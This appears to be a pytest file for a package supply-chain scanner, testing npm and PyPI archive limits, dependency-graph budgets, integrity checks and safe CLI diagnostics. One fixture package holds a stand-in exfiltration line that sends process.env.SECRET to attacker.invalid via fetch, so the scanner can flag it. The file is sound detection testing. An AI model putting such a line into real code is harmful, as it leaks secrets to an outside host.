"""Realistic bounded archives/graphs. Fixtures are parsed as inert data only."""
import base64
from dataclasses import replace
import hashlib
import io
import json
import shutil
import tarfile
import zipfile

import httpx
import pytest

from backend.guardian import cli, core, ingestion, npm_adapter, pypi_adapter, pypi
from backend.guardian.config import ArchiveLimits, NpmBudget
from backend.guardian.dependencies import RegistrySession, BudgetExceeded
from backend.guardian.supply_models import AcquisitionError, IntegrityError
from backend.tests.test_cli_npm import package, registry
from backend.tests.test_cli_pypi import wheel

REAL_DOWNLOAD = ingestion.download


def test_large_npm_acquired_through_registry_reader_once(monkeypatch, tmp_path):
    extras = {f'package/src/file{i}.js': f'const value{i} = {i};' for i in range(1200)}
    extras.update({f'package/assets/asset{i}.bin': 'opaque' for i in range(12)})
    fixture = package(extra=extras)
    _, urls = registry(monkeypatch, [fixture])
    transport = ingestion.download
    received = []
    def measure(*args, **kwargs):
        data = transport(*args, **kwargs)
        received.append(len(data))
        return data
    monkeypatch.setattr(ingestion, 'download', measure)
    calls = []
    original = ingestion.archive
    def trace(*args, **kwargs):
        calls.append(kwargs)
        return original(*args, **kwargs)
    monkeypatch.setattr(ingestion, 'archive', trace)
    plan = npm_adapter.resolve(['alpha'], tmp_path)
    assert len(plan.artifacts[0].files) == 1202
    assert len(urls) == 2 and len(calls) == 1
    assert calls[0]['limits'].profile == 'npm'
    expected_expanded = sum(len(value.encode()) for value in (dict({'package/package.json': json.dumps(fixture[0]), 'package/index.js': 'module.exports = 42;'}, **extras)).values())
    assert plan.acquisition['expanded_bytes'] == expected_expanded
    assert plan.acquisition['downloaded_bytes'] == sum(received)
    # Parser omissions/opaque files still require review; acquisition is not a safety claim.
    report = core.analyze_plan(plan)
    assert report.files_analyzed > 0 and report.cli['decision']['decision'] == 'REVIEW'
    assert not report.cli['decision']['overridable']


def test_archive_entry_configuration_and_hard_ceiling(monkeypatch, tmp_path):
    monkeypatch.setenv('GUARDIAN_NPM_ARCHIVE_ENTRIES', '600')
    registry(monkeypatch, [package(extra={f'package/f{i}.js': 'const v=1;' for i in range(650)})])
    with pytest.raises(AcquisitionError) as caught:
        npm_adapter.resolve(['alpha'], tmp_path)
    assert caught.value.category == 'archive_entry_limit'
    assert caught.value.limit == 600 and caught.value.encountered == 601
    monkeypatch.setenv('GUARDIAN_NPM_ARCHIVE_ENTRIES', '999999999')
    assert ArchiveLimits.from_env('npm').entries == 20000
    _, raw = package(extra={f'package/a{i}.bin': 'x' for i in range(20000)})
    with pytest.raises(AcquisitionError) as caught:
        npm_adapter._manifest_files(raw)
    assert caught.value.category == 'archive_entry_limit' and caught.value.encountered == 20001


@pytest.mark.parametrize('profile', ['npm', 'wheel', 'sdist'])
def test_archive_budgets_are_distinct_and_bounded(monkeypatch, profile):
    monkeypatch.setenv(f'GUARDIAN_{profile.upper()}_ARCHIVE_ENTRIES', '999999999')
    monkeypatch.setenv(f'GUARDIAN_{profile.upper()}_ARCHIVE_COMPRESSED_MB', '999999999')
    limits = ArchiveLimits.from_env(profile)
    assert limits.entries == 20000 and limits.compressed <= 100*1024*1024
    assert ArchiveLimits.from_env('upload').entries == 500
    assert ArchiveLimits.from_env('upload').compressed == 10*1024*1024


def test_supported_sources_and_opaque_bytes_have_separate_limits():
    _, raw = package(extra={'package/a.js': 'const a=1;', 'package/a.bin': 'x'*100})
    limits = ArchiveLimits.from_env('npm')
    with pytest.raises(AcquisitionError) as caught:
        ingestion.archive(raw, 'tar', limits=replace(limits, sources=2), root='package')
    assert caught.value.category == 'archive_source_limit'
    with pytest.raises(AcquisitionError) as caught:
        ingestion.archive(raw, 'tar', limits=replace(limits, expanded=110), root='package')
    assert caught.value.category == 'archive_expanded_limit'
    with pytest.raises(AcquisitionError) as caught:
        ingestion.archive(raw, 'tar', limits=replace(limits, file=90), root='package')
    assert caught.value.category == 'archive_file_limit'


def express_graph():
    branches = {f'branch{i}': '1.0.0' for i in range(8)}
    fixtures = [package('root', dependencies=branches)]
    fixtures += [package(name, dependencies={'common': '2.0.0' if i == 7 else '1.0.0', 'other': '1.0.0'}) for i, name in enumerate(branches)]
    fixtures += [package('common', dependencies={'leaf': '1.0.0', 'root': '1.0.0'}, source='fetch("https://attacker.invalid", {body:process.env.SECRET});'),
                 package('common', '2.0.0', dependencies={'leaf': '1.0.0'}),
                 package('other', dependencies={'leaf': '1.0.0'}), package('leaf')]
    return fixtures


def test_express_like_locations_are_not_artifact_budget(monkeypatch, tmp_path):
    _, urls = registry(monkeypatch, express_graph())
    parsed = []
    original_archive = ingestion.archive
    def archive(*args, **kwargs):
        parsed.append(True)
        return original_archive(*args, **kwargs)
    monkeypatch.setattr(ingestion, 'archive', archive)
    plan = npm_adapter.resolve(['root'], tmp_path)
    assert len(plan.locations) == 41 and len(plan.artifacts) == 13
    assert len(parsed) == 13
    assert len(urls) == plan.acquisition['registry_requests'] == 25  # 12 names + 13 artifacts
    assert len(set(urls)) == 25
    assert len({(a.name, a.version) for a in plan.artifacts if a.name == 'common'}) == 2
    by_location = {n['location']: n for n in plan.locations}
    assert set(by_location) == set(plan.installer_data['lock']['packages']) - {''}
    assert by_location['node_modules/root/node_modules/branch0/node_modules/common']['dependencies'][-1] == 'node_modules/root'
    assert all(child in by_location for node in plan.locations for child in node['dependencies'])
    calls = []
    original_analyze = core.analyze_sources
    def trace(files, **kwargs):
        calls.append(True)
        return original_analyze(files, **kwargs)
    monkeypatch.setattr(core, 'analyze_sources', trace)
    report = core.analyze_plan(plan)
    assert len(calls) == 13 and report.inspection_summary.total == 13
    assert report.cli['location_count'] == 41 and report.cli['unique_artifacts'] == 13
    assert len([f for f in report.findings if f.rule == 'SENSITIVE_TRANSMISSION' and f.package == 'common@1.0.0']) == 1
    assert '41 installation locations' in cli.terminal(report)
    assert '13 unique package artifacts' in cli.terminal(report)


@pytest.mark.parametrize('setting,value,budget', [('GUARDIAN_NPM_LOCATIONS','20','installation_locations'), ('GUARDIAN_NPM_UNIQUE_ARTIFACTS','5','unique_artifacts'), ('GUARDIAN_NPM_DEPTH','2','dependency_depth')])
def test_actual_graph_limits_report_measured_counters(monkeypatch, tmp_path, setting, value, budget):
    registry(monkeypatch, express_graph())
    monkeypatch.setenv(setting, value)
    with pytest.raises(AcquisitionError) as caught:
        npm_adapter.resolve(['root'], tmp_path)
    assert caught.value.category == 'dependency_graph_limit'
    assert caught.value.budget == budget and caught.value.limit == int(value)
    assert caught.value.encountered == int(value) + 1
    assert not (tmp_path/'node_modules').exists()


def test_graph_hard_ceilings_are_enforced(monkeypatch):
    for name in ('UNIQUE_ARTIFACTS','LOCATIONS','DEPTH','REQUESTS','SECONDS','DOWNLOAD_MB','EXPANDED_MB','ANALYSIS_SECONDS'):
        monkeypatch.setenv('GUARDIAN_NPM_'+name, '999999999')
    budget = NpmBudget.from_env()
    assert (budget.artifacts, budget.locations, budget.depth, budget.requests) == (1024,10000,64,2048)
    assert budget.seconds == budget.analysis_seconds == 600
    assert budget.bytes == 512*1024*1024 and budget.expanded == 1024*1024*1024


def test_duplicate_artifact_obeys_every_lock_integrity(monkeypatch, tmp_path):
    _, urls = registry(monkeypatch, [package('root', dependencies={'left':'1.0.0','right':'1.0.0'}), package('left', dependencies={'shared':'1.0.0'}), package('right', dependencies={'shared':'1.0.0'}), package('shared')])
    (tmp_path/'package.json').write_text('{"dependencies":{"root":"1.0.0"}}')
    (tmp_path/'package-lock.json').write_text(json.dumps({'lockfileVersion':3,'packages':{'':{},'node_modules/root':{'version':'1.0.0'},'node_modules/left':{'version':'1.0.0'},'node_modules/right':{'version':'1.0.0'},'node_modules/left/node_modules/shared':{'version':'1.0.0'},'node_modules/right/node_modules/shared':{'version':'1.0.0','integrity':'sha512-'+base64.b64encode(b'x'*64).decode()}}}))
    with pytest.raises(IntegrityError):
        npm_adapter.resolve([],tmp_path)
    assert sum(url.endswith('shared-1.0.0.tgz') for url in urls) == 1


@pytest.mark.skipif(not shutil.which('npm'), reason='trusted npm unavailable')
def test_deduplicated_graph_installs_exact_bytes_with_scripts_disabled(monkeypatch, tmp_path):
    marker = tmp_path/'hook-executed'
    fixtures = [package('root', dependencies={'left':'1.0.0','right':'1.0.0'}), package('left',dependencies={'shared':'1.0.0'}),package('right',dependencies={'shared':'1.0.0'}),package('shared',scripts={'postinstall':'touch '+str(marker)})]
    registry(monkeypatch, fixtures)
    plan = npm_adapter.resolve(['root'], tmp_path)
    assert len(plan.artifacts) == 4 and len(plan.locations) == 5
    assert core.analyze_plan(plan).cli['decision']['decision'] == 'ALLOW'
    npm_adapter.install(plan,tmp_path)
    assert not marker.exists()
    by_hash={a.sha256:a for a in plan.artifacts}
    for node in plan.locations:
        artifact=by_hash[node['sha256']]
        assert (tmp_path/node['location']/'index.js').read_text() == artifact.files['index.js']
        assert json.loads((tmp_path/node['location']/'package.json').read_text())['version'] == artifact.version


@pytest.mark.parametrize('failure,category', [('timeout','registry_timeout'),('http','registry_http_error'),('metadata','invalid_package_metadata'),('tarball_timeout','tarball_timeout'),('oversized','tarball_download_limit'),('entries','archive_entry_limit'),('expanded','archive_expanded_limit'),('graph','dependency_graph_limit'),('integrity','integrity_mismatch')])
@pytest.mark.parametrize('verbose',[False,True])
def test_cli_safe_diagnostics(monkeypatch,tmp_path,capsys,failure,category,verbose):
    monkeypatch.chdir(tmp_path)
    monkeypatch.setenv('GUARDIAN_HOME',str(tmp_path/'reports'))
    fixtures=[package(extra={'package/extra.js':'const n=1;'})]
    if failure=='graph':
        fixtures=express_graph();monkeypatch.setenv('GUARDIAN_NPM_LOCATIONS','20')
    releases,_=registry(monkeypatch,fixtures)
    transport=ingestion.download
    secret='Bearer sensitive-token /private/sensitive-path'
    def fail(url,*args,**kwargs):
        tarball=url.endswith('.tgz')
        if failure=='timeout' or (failure=='tarball_timeout' and tarball):
            raise httpx.ReadTimeout(secret)
        if failure=='http':
            response=httpx.Response(503,request=httpx.Request('GET','https://registry.npmjs.org/'+secret))
            raise httpx.HTTPStatusError(secret,request=response.request,response=response)
        if failure=='metadata' and not tarball:
            return b'not json: '+secret.encode()
        if failure=='oversized' and tarball:
            return b'x'*(1024*1024+1)
        return transport(url,*args,**kwargs)
    monkeypatch.setattr(ingestion,'download',fail)
    if failure=='oversized': monkeypatch.setenv('GUARDIAN_NPM_ARCHIVE_COMPRESSED_MB','1')
    if failure in ('entries','expanded'):
        actual=ArchiveLimits.from_env
        monkeypatch.setattr(ArchiveLimits,'from_env',classmethod(lambda cls, profile: replace(actual(profile), **({'entries':2} if failure=='entries' else {'expanded':20}))))
    if failure=='integrity':
        releases['alpha']['1.0.0'][0]['dist']['integrity']='sha512-'+base64.b64encode(b'x'*64).decode()
    args=['install','root' if failure=='graph' else 'alpha','--ecosystem','npm']
    if verbose: args.append('--verbose')
    assert cli.main(args) == (cli.EXIT_INTEGRITY if failure=='integrity' else cli.EXIT_ACQUIRE)
    output=capsys.readouterr().err
    assert category in output and secret not in output
    assert 'No installation was attempted.' in output
    if verbose: assert 'operation:' in output
    assert not (tmp_path/'node_modules').exists()


def test_programming_errors_do_not_become_network_failures(monkeypatch,tmp_path,capsys):
    monkeypatch.chdir(tmp_path)
    monkeypatch.setattr(ingestion,'download',lambda *a,**k: (_ for _ in ()).throw(TypeError('private implementation detail')))
    assert cli.main(['check','alpha','--ecosystem','npm','--json','--verbose']) == cli.EXIT_INTERNAL
    data=json.loads(capsys.readouterr().out)
    assert data['exit_code'] == cli.EXIT_INTERNAL and 'private implementation' not in data['error']


def test_request_download_and_elapsed_limits(monkeypatch,tmp_path):
    releases,_=registry(monkeypatch,[package()])
    session=RegistrySession(replace(NpmBudget(),requests=1))
    session.metadata[('alpha','1.0.0')]=releases['alpha']['1.0.0'][0]
    session.fetch('https://registry.npmjs.org/alpha')
    with pytest.raises(BudgetExceeded) as caught: session.retrieve('alpha','1.0.0')
    assert caught.value.category=='registry_request_limit'
    session=RegistrySession(replace(NpmBudget(),bytes=1))
    with pytest.raises(AcquisitionError) as caught: session.fetch('https://registry.npmjs.org/alpha')
    assert caught.value.category=='registry_response_limit' and session.bytes > 0
    session=RegistrySession(replace(NpmBudget(),seconds=1));session.started-=2
    with pytest.raises(BudgetExceeded) as caught: session.retrieve('alpha','1.0.0')
    assert caught.value.category=='acquisition_time_limit'


def test_analysis_time_limit_is_review_and_not_overridable(monkeypatch,tmp_path):
    registry(monkeypatch,[package()]);plan=npm_adapter.resolve(['alpha'],tmp_path)
    plan.budgets['analysis_seconds']=0
    monkeypatch.setattr(core,'analyze_sources',lambda *a,**k: pytest.fail('analysis beyond budget'))
    report=core.analyze_plan(plan)
    assert report.cli['decision']['decision']=='REVIEW' and not report.cli['decision']['overridable']
    assert any('budget exhausted' in reason for reason in report.cli['decision']['review_reasons'])


def test_large_python_distributions_do_not_inherit_upload_limit(monkeypatch,tmp_path):
    filename,raw=wheel(extra_files={f'guardian_benign/mod{i}.py':'VALUE=1\n' for i in range(650)})
    artifact,_,_=pypi_adapter._inspect(raw,filename,True)
    assert len(artifact.files)>650
    with pytest.raises(AcquisitionError) as caught: ingestion.archive(raw,'zip')
    assert caught.value.category=='archive_entry_limit' and caught.value.limit==500
    url='https://files.pythonhosted.org/packages/'+filename
    metadata={'info':{'name':'guardian-benign','version':'1.0.0'},'urls':[{'filename':filename,'url':url,'packagetype':'bdist_wheel','digests':{'sha256':hashlib.sha256(raw).hexdigest()}}]}
    monkeypatch.setattr(pypi,'download_pypi_url',lambda location,*a,**k: raw if location==url else json.dumps(metadata).encode())
    assert len(pypi.PyPISession().retrieve('guardian-benign','1.0.0').files)>650
    archive=io.BytesIO()
    with tarfile.open(fileobj=archive,mode='w:gz') as tar:
        for i in range(650):
            content=b'VALUE=1\n';info=tarfile.TarInfo(f'demo-1.0.0/demo/mod{i}.py');info.size=len(content);tar.addfile(info,io.BytesIO(content))
    artifact,_,_=pypi_adapter._inspect(archive.getvalue(),'demo-1.0.0.tar.gz',True)
    assert artifact.kind=='sdist' and len(artifact.files)==650


def test_json_diagnostics_preserve_budget_context(monkeypatch,tmp_path,capsys):
    registry(monkeypatch,express_graph())
    monkeypatch.chdir(tmp_path)
    monkeypatch.setenv('GUARDIAN_NPM_LOCATIONS','20')
    assert cli.main(['check','root','--ecosystem','npm','--json','--verbose']) == cli.EXIT_ACQUIRE
    result=json.loads(capsys.readouterr().out)
    assert result['diagnostic']['category']=='dependency_graph_limit'
    assert result['diagnostic']['budget']=='installation_locations'
    assert result['diagnostic']['limit']==20 and result['diagnostic']['encountered']==21


def test_static_evaluation_budget_warning_is_not_clean(monkeypatch,tmp_path):
    registry(monkeypatch,[package()]);plan=npm_adapter.resolve(['alpha'],tmp_path)
    monkeypatch.setattr(core,'analyze_sources',lambda *a,**k: ('alpha','1.0.0',[],[],['index.js: Static evaluation step budget exceeded'],1))
    report=core.analyze_plan(plan)
    assert report.cli['decision']['decision']=='REVIEW'
    assert not report.cli['decision']['overridable']


def test_partial_download_timeout_counts_received_bytes(monkeypatch):
    monkeypatch.setattr(ingestion, 'download', REAL_DOWNLOAD)
    original_client=httpx.Client
    class Stream(httpx.SyncByteStream):
        def __iter__(self):
            yield b'x'*65536
            raise httpx.ReadTimeout('private upstream URL and credentials')
    transport=httpx.MockTransport(lambda req:httpx.Response(200,stream=Stream(),request=req))
    monkeypatch.setattr(httpx,'Client',lambda **kwargs: original_client(transport=transport,**kwargs))
    session=RegistrySession(NpmBudget())
    with pytest.raises(AcquisitionError) as caught:
        session.fetch('https://registry.npmjs.org/alpha/-/alpha-1.0.0.tgz','tarball download','alpha@1.0.0')
    assert caught.value.category=='tarball_timeout' and session.bytes==65536
    assert 'private' not in str(caught.value) and caught.value.__cause__ is not None


def test_archive_inspection_time_limit_is_structured(monkeypatch):
    _,raw=package(extra={'package/a.js':'const a=1;'})
    times=iter([0,2,2])
    monkeypatch.setattr(ingestion.time,'monotonic',lambda:next(times,2))
    with pytest.raises(AcquisitionError) as caught:
        ingestion.archive(raw,'tar',limits=replace(ArchiveLimits.from_env('npm'),seconds=1),root='package')
    assert caught.value.category=='archive_timeout' and caught.value.limit==1


def test_generated_graph_substitution_refused_before_npm(monkeypatch,tmp_path):
    registry(monkeypatch,[package()]);plan=npm_adapter.resolve(['alpha'],tmp_path)
    plan.installer_data['lock']['packages']['node_modules/alpha']['dependencies']={'unapproved':'1.0.0'}
    monkeypatch.setattr(npm_adapter,'_run',lambda *a,**k: pytest.fail('modified graph reached npm'))
    with pytest.raises(IntegrityError,match='lock graph changed'):
        npm_adapter.install(plan,tmp_path)


def test_shared_artifact_keeps_context_specific_child_versions(monkeypatch,tmp_path):
    fixtures=[package('root',dependencies={'left':'1.0.0','right':'1.0.0'}),package('left',dependencies={'bridge':'1.0.0'}),package('right',dependencies={'bridge':'1.0.0'}),package('bridge',dependencies={'leaf':'^1.0.0'}),package('leaf'),package('leaf','1.1.0')]
    registry(monkeypatch,fixtures)
    (tmp_path/'package.json').write_text('{"dependencies":{"root":"1.0.0"}}')
    entries={'':{},'node_modules/root':{'version':'1.0.0'},'node_modules/left':{'version':'1.0.0'},'node_modules/right':{'version':'1.0.0'},'node_modules/left/node_modules/bridge':{'version':'1.0.0'},'node_modules/right/node_modules/bridge':{'version':'1.0.0'},'node_modules/left/node_modules/bridge/node_modules/leaf':{'version':'1.0.0'},'node_modules/right/node_modules/bridge/node_modules/leaf':{'version':'1.1.0'}}
    (tmp_path/'package-lock.json').write_text(json.dumps({'lockfileVersion':3,'packages':entries}))
    plan=npm_adapter.resolve([],tmp_path)
    assert len([a for a in plan.artifacts if a.name=='bridge'])==1
    graph={n['location']:n for n in plan.locations}
    left='node_modules/root/node_modules/left/node_modules/bridge/node_modules/leaf'
    right='node_modules/root/node_modules/right/node_modules/bridge/node_modules/leaf'
    assert graph[left]['identity']=='npm:leaf@1.0.0' and graph[right]['identity']=='npm:leaf@1.1.0'
    bridge=next(a for a in plan.artifacts if a.name=='bridge')
    assert set(bridge.dependencies)=={'npm:leaf@1.0.0','npm:leaf@1.1.0'}


def test_python_opaque_members_count_toward_expanded_limit():
    filename,raw=wheel(extra_files={'guardian_benign/data.bin':'x'*1000})
    with pytest.raises(AcquisitionError) as caught:
        pypi_adapter._inspect(raw,filename,True,limits=replace(ArchiveLimits.from_env('wheel'),expanded=500))
    assert caught.value.category=='archive_expanded_limit'


def test_pypi_resolver_aggregate_expanded_budget(monkeypatch,tmp_path):
    from backend.tests.test_cli_pypi import registry as python_registry
    _,metadata,_=python_registry(monkeypatch,{('guardian_benign','1.0.0'):wheel()})
    resolver=pypi_adapter._Resolver();resolver.expanded=resolver.expanded_limit
    resolver.metadata=metadata
    with pytest.raises(AcquisitionError) as caught:
        resolver.artifact('guardian-benign','1.0.0')
    assert caught.value.category=='expanded_budget_limit'
